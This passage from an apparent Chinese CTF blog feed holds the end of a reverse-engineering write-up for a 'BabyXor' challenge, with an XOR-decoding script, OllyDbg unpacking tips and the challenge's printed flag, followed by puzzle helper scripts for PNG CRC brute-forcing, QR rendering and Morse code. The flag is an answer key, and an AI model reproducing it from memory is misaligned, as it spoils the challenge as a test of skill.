&#x3D; 14 组<br>所以导出的数据其实可以简化如下： <em>（可以在 Pycharm 中使用 Ctrl + F 进行替换快速得到）</em></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">unk_435DC0 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x6D</span><span class="token punctuation">,</span> <span class="token number">0x63</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x7F</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x6B</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">]</span>    dword_435DF8 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x6F</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x7A</span><span class="token punctuation">]</span>    dword_435E30 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0x5D</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>按照程序逻辑，编写脚本，分别使用三个函数生成三个字符串，然后进行拼接</p><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python">unk_435DC0 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x6D</span><span class="token punctuation">,</span> <span class="token number">0x63</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x7F</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x6B</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">]</span>  dword_435DF8 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x6F</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x7A</span><span class="token punctuation">]</span>  dword_435E30 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0x5D</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">]</span>    v8 <span class="token operator">=</span> <span class="token string">""</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      v8 <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>i <span class="token operator">^</span> unk_435DC0<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>v8<span class="token punctuation">)</span>      Src <span class="token operator">=</span> <span class="token string">""</span>  Src <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>dword_435DF8<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 下面的循环是从第二个元素开始，不要忘了还有个没改变的第一个值  </span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      Src <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>unk_435DC0<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">^</span> dword_435DF8<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">^</span> unk_435DC0<span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>Src<span class="token punctuation">)</span>      Source <span class="token operator">=</span> <span class="token string">""</span>  <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      Source <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>k <span class="token operator">^</span> dword_435E30<span class="token punctuation">[</span>k <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>Src<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  Destination <span class="token operator">=</span> <span class="token string">""</span>  Destination <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>dword_435DF8<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">^</span> dword_435E30<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  v5 <span class="token operator">=</span> Destination <span class="token operator">+</span> Source  <span class="token keyword">print</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span>      flag <span class="token operator">=</span> v8 <span class="token operator">+</span> Src <span class="token operator">+</span> v5  <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h1><p>由于发现 flag 与程序输入无关，是由程序内部的数据运算得到的，并且 <code>sub_40101E(v8, Src, v5)</code> 函数中直接拼接得到了 flag<br>所以 flag 一定会出现在程序中，于是可以通过调试来观察 flag</p><p>用 OllyDBG 打开，定位到最后拼接 flag 的 <code>sub_40101E(v8, Src, v5)</code> 函数处</p><p>根据 <code>call    sub_40101E</code> 的地址 <code>0x00401712</code> 处下断点，直接运行看堆栈数据就能得出 flag</p><blockquote><p><del>但是前面我脱壳之后的程序只能在 IDA 中正常分析，却无法双击运行</del></p><p>原因找到了，在 <code>右键 --&gt; 用 OllyDump脱壳调试进程</code> 进行脱壳的时候</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor29.png" alt="攻防世界_BabyXor29.png"></p><p>左下角有两种方式<br><strong>我前面是选择的 <code>方式 1</code>，虽然成功脱壳了，可以 IDA 静态分析，但是却无法运行程序</strong><br><strong>后来选了 <code>方式 2</code> 试了一下，发现既可以 IDA 静态分析，也可以运行程序了</strong></p><p><mark>（脱壳的时候最好两种方式都试一试）</mark></p></blockquote><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>flag{2378b077-7d6e-4564-bdca-7eec8eede9a2}</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor28.png" alt="攻防世界_BabyXor28.png"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF杂项中的脚本</title>
      <link href="/posts/820f1457.html"/>
      <url>/posts/820f1457.html</url>
      
        <content type="html"><![CDATA[<h1 id="CRC-爆破图片宽高"><a href="#CRC-爆破图片宽高" class="headerlink" title="CRC 爆破图片宽高"></a>CRC 爆破图片宽高</h1><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E9%9A%90%E5%86%991.png" alt="隐写1.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> struct  <span class="token keyword">import</span> zlib    <span class="token comment"># --------------- 需要修改的参数 ---------------</span><span class="token comment"># (直接从WinHex中以十六进制数值复制选块)</span>str1 <span class="token operator">=</span> <span class="token string">"49484452"</span>  <span class="token comment"># IHDR  </span>width <span class="token operator">=</span> <span class="token string">"01DA"</span>  <span class="token comment"># 图片宽度  </span>height <span class="token operator">=</span> <span class="token string">"00EF"</span>  <span class="token comment"># 图片高度  </span>str2 <span class="token operator">=</span> <span class="token string">"0806000000"</span>  <span class="token comment"># 图片高度height~CRC之间的5个字节  </span>crc32 <span class="token operator">=</span> <span class="token string">"52084BFB"</span>  <span class="token comment"># CRC  </span>add_num <span class="token operator">=</span> <span class="token number">2000</span>  <span class="token comment"># 最大宽高，合理修改快速出flag (一般可不修改)  </span><span class="token comment"># -------------------------------------------  </span>    <span class="token keyword">def</span> <span class="token function">hexStr2bytes</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>      b <span class="token operator">=</span> <span class="token string">b""</span>      <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>          temp <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span>          b <span class="token operator">+=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"B"</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>temp<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> b      check <span class="token operator">=</span> <span class="token number">0</span>  bytes1 <span class="token operator">=</span> hexStr2bytes<span class="token punctuation">(</span>str1<span class="token punctuation">)</span>  bytes2 <span class="token operator">=</span> hexStr2bytes<span class="token punctuation">(</span>str2<span class="token punctuation">)</span>  crc <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>crc32<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  wid <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>width<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>  hei <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>height<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> w <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>wid<span class="token punctuation">,</span> wid <span class="token operator">+</span> add_num<span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">for</span> h <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>hei<span class="token punctuation">,</span> hei <span class="token operator">+</span> add_num<span class="token punctuation">)</span><span class="token punctuation">:</span>          width <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>w<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>          height <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>h<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>          bytes_temp <span class="token operator">=</span> hexStr2bytes<span class="token punctuation">(</span>width <span class="token operator">+</span> height<span class="token punctuation">)</span>          <span class="token keyword">if</span> <span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>zlib<span class="token punctuation">.</span>crc32<span class="token punctuation">(</span>bytes1 <span class="token operator">+</span> bytes_temp <span class="token operator">+</span> bytes2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>crc<span class="token punctuation">)</span><span class="token punctuation">:</span>              <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"爆破成功!"</span><span class="token punctuation">)</span>              <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"正确的宽高:"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>w<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>h<span class="token punctuation">)</span><span class="token punctuation">)</span>              check <span class="token operator">=</span> <span class="token number">1</span>              <span class="token keyword">break</span>  <span class="token keyword">if</span> check <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"爆破失败！"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="01序列转二维码"><a href="#01序列转二维码" class="headerlink" title="01序列转二维码"></a>01序列转二维码</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image    key <span class="token operator">=</span> <span class="token string">""</span>  <span class="token comment"># 二维码01序列  </span>MAX <span class="token operator">=</span> <span class="token number">25</span>  <span class="token comment"># 二维码的长宽  </span>pic <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">"RGB"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>MAX<span class="token punctuation">,</span> MAX<span class="token punctuation">)</span><span class="token punctuation">)</span>  white <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span>  black <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>  i <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> MAX<span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> MAX<span class="token punctuation">)</span><span class="token punctuation">:</span>          <span class="token keyword">if</span> key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>              pic<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">[</span>x<span class="token punctuation">,</span> y<span class="token punctuation">]</span><span class="token punctuation">,</span> black<span class="token punctuation">)</span>          <span class="token keyword">else</span><span class="token punctuation">:</span>              pic<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">[</span>x<span class="token punctuation">,</span> y<span class="token punctuation">]</span><span class="token punctuation">,</span> white<span class="token punctuation">)</span>          i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>  pic<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="摩斯密码加解密"><a href="#摩斯密码加解密" class="headerlink" title="摩斯密码加解密"></a>摩斯密码加解密</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python">MORSE_CODE_DICT <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'A'</span><span class="token punctuation">:</span> <span class="token string">'.-'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">:</span> <span class="token string">'-...'</span><span class="token punctuation">,</span> <span class="token string">'C'</span><span class="token punctuation">:</span> <span class="token string">'-.-.'</span><span class="token punctuation">,</span> <span class="token string">'D'</span><span class="token punctuation">:</span> <span class="token string">'-..'</span><span class="token punctuation">,</span>                     <span class="token string">'E'</span><span class="token punctuation">:</span> <span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token string">'F'</span><span class="token punctuation">:</span> <span class="token string">'..-.'</span><span class="token punctuation">,</span> <span class="token string">'G'</span><span class="token punctuation">:</span> <span class="token string">'--.'</span><span class="token punctuation">,</span> <span class="token string">'H'</span><span class="token punctuation">:</span> <span class="token string">'....'</span><span class="token punctuation">,</span>                     <span class="token string">'I'</span><span class="token punctuation">:</span> <span class="token string">'..'</span><span class="token punctuation">,</span> <span class="token string">'J'</span><span class="token punctuation">:</span> <span class="token string">'.---'</span><span class="token punctuation">,</span> <span class="token string">'K'</span><span class="token punctuation">:</span> <span class="token string">'-.-'</span><span class="token punctuation">,</span> <span class="token string">'L'</span><span class="token punctuation">:</span> <span class="token string">'.-..'</span><span class="token punctuation">,</span>                     <span class="token string">'M'</span><span class="token punctuation">:</span> <span class="token string">'--'</span><span class="token punctuation">,</span> <span class="token string">'N'</span><span class="token punctuation">:</span> <span class="token string">'-.'</span><span class="token punctuation">,</span> <span class="token string">'O'</span><span class="token punctuation">:</span> <span class="token string">'---'</span><span class="token punctuation">,</span> <span class="token string">'P'</span><span class="token punctuation">:</span> <span class="token string">'.--.'</span><span class="token punctuation">,</span>                     <span class="token string">'Q'</span><span class="token punctuation">:</span> <span class="token string">'--.-'</span><span class="token punctuation">,</span> <span class="token string">'R'</span><span class="token punctuation">:</span> <span class="token string">'.-.'</span><span class="token punctuation">,</span> <span class="token string">'S'</span><span class="token punctuation">:</span> <span class="token string">'...'</span><span class="token punctuation">,</span> <span class="token string">'T'</span><span class="token punctuation">:</span> <span class="token string">'-'</span><span class="token punctuation">,</span>                     <span class="token string">'U'</span><span class="token punctuation">:</span> <span class="token string">'..-'</span><span class="token punctuation">,</span> <span class="token string">'V'</span><span class="token punctuation">:</span> <span class="token string">'...-'</span><span class="token punctuation">,</span> <span class="token string">'W'</span><span class="token punctuation">:</span> <span class="token string">'.--'</span><span class="token punctuation">,</span> <span class="token string">'X'</span><span class="token punctuation">:</span> <span class="token string">'-..-'</span><span class="token punctuation">,</span>                     <span class="token string">'Y'</span><span class="token punctuation">:</span> <span class="token string">'-.--'</span><span class="token punctuation">,</span> <span class="token string">'Z'</span><span class="token punctuation">:</span> <span class="token string">'--..'</span><span class="token punctuation">,</span>                     <span class="token string">'0'</span><span class="token punctuation">:</span> <span class="token string">'-----'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">:</span> <span class="token string">'.----'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">:</span> <span class="token string">'..---'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">:</span> <span class="token string">'...--'</span><span class="token punctuation">,</span>                     <span class="token string">'4'</span><span class="token punctuation">:</span> <span class="token string">'....-'</span><span class="token punctuation">,</span> <span class="token string">'5'</span><span class="token punctuation">:</span> <span class="token string">'.....'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">:</span> <span class="token string">'-....'</span><span class="token punctuation">,</span> <span class="token string">'7'</span><span class="token punctuation">:</span> <span class="token string">'--...'</span><span class="token punctuation">,</span>                     <span class="token string">'8'</span><span class="token punctuation">:</span> <span class="token string">'---..'</span><span class="token punctuation">,</span> <span class="token string">'9'</span><span class="token punctuation">:</span> <span class="token string">'----.'</span><span class="token punctuation">,</span>                     <span class="token string">'.'</span><span class="token punctuation">:</span> <span class="token string">'.-.-.-'</span><span class="token punctuation">,</span> <span class="token string">':'</span><span class="token punctuation">:</span> <span class="token string">'---...'</span><span class="token punctuation">,</span> <span class="token string">','</span><span class="token punctuation">:</span> <span class="token string">'--..--'</span><span class="token punctuation">,</span> <span class="token string">';'</span><span class="token punctuation">:</span> <span class="token string">'-.-.-.'</span><span class="token punctuation">,</span>                     <span class="token string">'?'</span><span class="token punctuation">:</span> <span class="token string">'..--..'</span><span class="token punctuation">,</span> <span class="token string">'='</span><span class="token punctuation">:</span> <span class="token string">'-...-'</span><span class="token punctuation">,</span> <span class="token string">'\''</span><span class="token punctuation">:</span> <span class="token string">'.----.'</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">:</span> <span class="token string">'-..-.'</span><span class="token punctuation">,</span>                     <span class="token string">'!'</span><span class="token punctuation">:</span> <span class="token string">'-.-.--'</span><span class="token punctuation">,</span> <span class="token string">'-'</span><span class="token punctuation">:</span> <span class="token string">'-....-'</span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">:</span> <span class="token string">'..--.-'</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">:</span> <span class="token string">'.-..-.'</span><span class="token punctuation">,</span>                     <span class="token string">'('</span><span class="token punctuation">:</span> <span class="token string">'-.--.'</span><span class="token punctuation">,</span> <span class="token string">')'</span><span class="token punctuation">:</span> <span class="token string">'-.--.-'</span><span class="token punctuation">,</span> <span class="token string">'$'</span><span class="token punctuation">:</span> <span class="token string">'...-..-'</span><span class="token punctuation">,</span> <span class="token string">'&amp;'</span><span class="token punctuation">:</span> <span class="token string">'....'</span><span class="token punctuation">,</span>                     <span class="token string">'@'</span><span class="token punctuation">:</span> <span class="token string">'.--.-.'</span><span class="token punctuation">,</span> <span class="token string">'+'</span><span class="token punctuation">:</span> <span class="token string">'.-.-.'</span><span class="token punctuation">,</span>                     <span class="token punctuation">&#125;</span>      <span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>      cipher <span class="token operator">=</span> <span class="token string">''</span>      <span class="token keyword">for</span> s <span class="token keyword">in</span> message<span class="token punctuation">:</span>          cipher <span class="token operator">+=</span> MORSE_CODE_DICT<span class="token punctuation">.</span>get<span class="token punctuation">(</span>s<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span>          <span class="token keyword">if</span> s <span class="token operator">!=</span> message<span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>              cipher <span class="token operator">+=</span> <span class="token string">' '</span>  <span class="token comment"># 每加密一个字符用空格隔开  </span>    <span class="token keyword">return</span> cipher      <span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>      message <span class="token operator">+=</span> <span class="token string">' '</span>  <span class="token comment"># 在末尾添加额外空间以访问最后一个摩斯密码  </span>    decipher <span class="token operator">=</span> <span class="token string">''</span>      citext <span class="token operator">=</span> <span class="token string">''</span>      <span class="token keyword">global</span> i      <span class="token keyword">for</span> letter <span class="token keyword">in</span> message<span class="token punctuation">:</span>          <span class="token keyword">if</span> letter <span class="token operator">!=</span> <span class="token string">' '</span><span class="token punctuation">:</span>              i <span class="token operator">=</span> <span class="token number">0</span>              citext <span class="token operator">+=</span> letter          <span class="token keyword">else</span><span class="token punctuation">:</span>              i <span class="token operator">+=</span> <span class="token number">1</span>  <span class="token comment"># 如果i=1表示一个新字符  </span>            <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>  <span class="token comment"># 如果i=2表示一个新单词  </span>                decipher <span class="token operator">+=</span> <span class="token string">' '</span>  <span class="token comment"># 添加空格来分隔单词  </span>            <span class="token keyword">else</span><span class="token punctuation">:</span>  <span class="token comment"># 使用它们的值访问密钥（加密的反向）  </span>                decipher <span class="token operator">+=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>MORSE_CODE_DICT<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token builtin">list</span><span class="token punctuation">(</span>MORSE_CODE_DICT<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>index<span class="token punctuation">(</span>citext<span class="token punctuation">)</span><span class="token punctuation">]</span>                  citext <span class="token operator">=</span> <span class="token string">''</span>      <span class="token keyword">return</span> decipher      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"           摩斯加解密系统             "</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"*************************************"</span><span class="token punctuation">)</span>    num <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"选择要进行的操作? (1:加密 or 2:解密) 你的选择: "</span><span class="token punctuation">)</span>  <span class="token keyword">if</span> num <span class="token operator">==</span> <span class="token string">"1"</span> <span class="token keyword">or</span> num <span class="token operator">==</span> <span class="token string">"1:加密"</span><span class="token punctuation">:</span>      input_str <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"输入明文以加密: "</span><span class="token punctuation">)</span>      <span class="token keyword">print</span><span class="token punctuation">(</span>encrypt<span class="token punctuation">(</span>input_str<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">elif</span> num <span class="token operator">==</span> <span class="token string">"2"</span> <span class="token keyword">or</span> num <span class="token operator">==</span> <span class="token string">"2:解密"</span><span class="token punctuation">:</span>      input_str <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"输入密文以解密: "</span><span class="token punctuation">)</span>      <span class="token keyword">print</span><span class="token punctuation">(</span>decrypt<span class="token punctuation">(</span>input_str<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" 